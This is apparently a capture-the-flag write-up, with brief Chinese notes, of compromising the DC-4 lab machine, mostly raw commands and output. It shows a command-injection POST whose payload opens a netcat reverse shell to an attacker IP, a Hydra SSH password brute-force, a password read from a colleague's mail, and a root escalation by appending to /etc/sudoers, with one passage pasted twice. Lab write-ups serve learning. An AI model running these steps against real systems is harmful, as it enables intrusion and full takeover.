参考资料  
[https://medium.com/@Inching-Towards-Intelligence/pg-play-dc-4-63-100-76cbfa8be464](https://medium.com/@Inching-Towards-Intelligence/pg-play-dc-4-63-100-76cbfa8be464)
   

有时候邮件也很重要 这点是不能忽略的 密码可能就在mail中隐藏
   

爆破之后进行攻击  
post数据包  
ls+-l
 ![[DC-4 image 8268eaa3d9e09d68.png|Exported image]]   
创建shell数据包  
POST /command.php HTTP/1.1  
Host: 192.168.204.195  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 57  
Origin: [http://192.168.204.195](http://192.168.204.195)  
Connection: keep-alive  
Referer: [http://192.168.204.195/command.php](http://192.168.204.195/command.php)  
Cookie: PHPSESSID=eahot7ed75o14b6lb704cvfd90  
Upgrade-Insecure-Requests: 1  
Priority: u=0, i  
radio=ls+-l|nc -e /bin/bash 192.168.45.192 443&submit=Run
   

爆破密码
 
┌──(kali㉿kali)-[~/Downloads]  
└─$ hydra -l jim -P old-passwords.txt -e nsr -t 4 192.168.204.195 ssh  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2025-10-16 04:08:38  
[DATA] max 4 tasks per 1 server, overall 4 tasks, 255 login tries (l:1/p:255), ~64 tries per task  
[DATA] attacking ssh://192.168.204.195:22/
   

[STATUS] 95.00 tries/min, 95 tries in 00:01h, 160 to do in 00:02h, 4 active
 
[22][ssh] host: 192.168.204.195 login: jim password: jibril04  
1 of 1 target successfully completed, 1 valid password found  
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) finished at 2025-10-16 04:11:05
   

jim@dc-4:/var/mail$ cat jim  
From charles@dc-4 Sat Apr 06 21:15:46 2019  
Return-path: \<charles@dc-4\>  
Envelope-to: jim@dc-4  
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000  
Received: from charles by dc-4 with local (Exim 4.89)  
(envelope-from \<charles@dc-4\>)  
id 1hCjIX-0000kO-Qt  
for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000  
To: jim@dc-4  
Subject: Holidays  
MIME-Version: 1.0  
Content-Type: text/plain; charset="UTF-8"  
Content-Transfer-Encoding: 8bit  
Message-Id: \<E1hCjIX-0000kO-Qt@dc-4\>  
From: Charles \<charles@dc-4\>  
Date: Sat, 06 Apr 2019 21:15:45 +1000  
Status: O
 
Hi Jim,
 
I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
 
Password is: ^xHhA&hvim0y 这是密码
 
See ya,  
Charles
 
jim@dc-4:/var/mail$ su charles  
Password:  
charles@dc-4:/var/mail$ whomai  
bash: whomai: command not found  
charles@dc-4:/var/mail$
    
jim@dc-4:/var/mail$ cat jim  
From charles@dc-4 Sat Apr 06 21:15:46 2019  
Return-path: \<charles@dc-4\>  
Envelope-to: jim@dc-4  
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000  
Received: from charles by dc-4 with local (Exim 4.89)  
(envelope-from \<charles@dc-4\>)  
id 1hCjIX-0000kO-Qt  
for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000  
To: jim@dc-4  
Subject: Holidays  
MIME-Version: 1.0  
Content-Type: text/plain; charset="UTF-8"  
Content-Transfer-Encoding: 8bit  
Message-Id: \<E1hCjIX-0000kO-Qt@dc-4\>  
From: Charles \<charles@dc-4\>  
Date: Sat, 06 Apr 2019 21:15:45 +1000  
Status: O
 
Hi Jim,
 
I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
 
Password is: ^xHhA&hvim0y
 
See ya,  
Charles
 
jim@dc-4:/var/mail$ su charles  
Password:  
charles@dc-4:/var/mail$ whomai  
bash: whomai: command not found  
charles@dc-4:/var/mail$  
charles@dc-4:/var/mail$  
charles@dc-4:/var/mail$  
charles@dc-4:/var/mail$ sudo -l  
Matching Defaults entries for charles on dc-4:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
User charles may run the following commands on dc-4:  
(root) NOPASSWD: /usr/bin/teehee  
charles@dc-4:/var/mail$ echo "charles ALL=(ALL:ALL) ALL" | sudo /usr/bin/teehee /etc/sudoers  
charles ALL=(ALL:ALL) ALL  
charles@dc-4:/var/mail$ sudo su root
 
We trust you have received the usual lecture from the local System  
Administrator. It usually boils down to these three things:
 
#1) Respect the privacy of others.  
#2) Think before you type.  
#3) With great power comes great responsibility.
 
[sudo] password for charles:  
root@dc-4:/var/mail# cd /root  
root@dc-4:~# ls  
flag.txt proof.txt  
root@dc-4:~# cat flag.txt
    
888 888 888 888 8888888b. 888 888 888 888  
888 o 888 888 888 888 "Y88b 888 888 888 888  
888 d8b 888 888 888 888 888 888 888 888 888  
888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888  
888d88888b888 d8P Y8b 888 888 888 888 d88""88b 888 "88b d8P Y8b 888 888 888 888  
88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P  
8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. " " " "  
888P Y888 "Y8888 888 888 8888888P" "Y88P" 888 888 "Y8888 888 888 888 888
   

Congratulations!!!
 
Hope you enjoyed DC-4. Just wanted to send a big thanks out there to all those  
who have provided feedback, and who have taken time to complete these little  
challenges.
 
If you enjoyed this CTF, send me a tweet via @DCAU7.  
root@dc-4:~# cat proof.txt  
b48bb3aad0047e4d6978bf3313b51c7e  
root@dc-4:~#